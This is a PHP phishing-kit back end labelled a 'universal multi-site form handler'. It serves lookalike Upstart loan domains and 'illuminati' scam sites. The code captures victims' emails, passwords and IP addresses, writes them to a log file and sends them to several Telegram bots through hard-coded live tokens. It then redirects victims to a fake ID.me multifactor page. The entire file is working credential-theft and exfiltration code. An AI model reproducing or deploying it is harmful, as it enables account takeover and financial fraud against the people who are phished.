<?php
// =========================================
// 🌐 UNIVERSAL MULTI-SITE FORM HANDLER
// ✅ Using HTTP_REFERER to detect form source domain
// =========================================


// === Configuration: Replace with real domains ===
$site_map = [
    'upstartloan.rf.gd' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstartloan.rf.gd/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],

    'upstarts.onrender.com' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8187021949:AAED4PdfxR4o4oRJjLMht3UnBDp52FFG8Ok', 'chat_id' => '5768557636']
        ],
        'redirect' => 'https://upstarts.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],

    'upstart-l69v.onrender.com' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '7775401700:AAFsyHpfgM9kNryQozLz8Mjmp5lDeaG0D44', 'chat_id' => '7510889526']
        ],
        'redirect' => 'https://upstart-l69v.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],

    'upstartloans-704y.onrender.com' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U', 'chat_id' => '7339107338']
        ],
        'redirect' => 'https://upstartloans-704y.onrender.com/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],

    
    'upstartsloan.42web.io' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']

        ],
        'redirect' => 'https://upstartsloan.42web.io/cache_site/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],

    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            
            ['token' => '8327467242:AAFFBheM0nU1-45BKH5vAvdfXKhgXPopJvg', 'chat_id' => '7919111838']

        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
    ],


    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8573585719:AAH3nsPej6dsiVQke8r2EmVo0Ri8rWz8C1c', 'chat_id' => '7207169369'],
        ],
        "redirect" => "https://illuminatipath.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],




    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],


    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html"
    ],



    // Add more sites...
];



$log_file = 'submission_log.txt';

// === Logging Function ===
function logToFile($data, $file) {
    $entry = "[" . date("Y-m-d H:i:s") . "] " . $data . "\n";
    file_put_contents($file, $entry, FILE_APPEND);
}

// === Telegram Sender ===
function sendToBots($message, $bots) {
    foreach ($bots as $bot) {
        $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true
        ]);
        curl_exec($ch);
        curl_close($ch);
    }
}

// === Main Logic ===
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Use HTTP_REFERER to determine where the form was hosted
    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $parsed  = parse_url($referer);
    $domain  = $parsed['host'] ?? 'unknown-origin';

    $useremail    = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
    $timestamp    = date("Y-m-d H:i:s");

    $msg = "📝 *New Submission from $domain*\n\n".
           "👤 *Email:* $useremail\n".
           "🔑 *Password:* $userpassword\n".
           "🌐 *IP:* $ip\n".
           "⏰ *Time:* $timestamp";

    logToFile("[$domain] $useremail | $userpassword | $ip", $log_file);

    if (isset($site_map[$domain])) {
        $site_config = $site_map[$domain];
        sendToBots($msg, $site_config['bots']);
        header("Location: " . $site_config['redirect']);
        exit;
    } else {
        logToFile("❌ Unauthorized domain: $domain", $log_file);
        exit("Unauthorized domain");
    }
}
?>
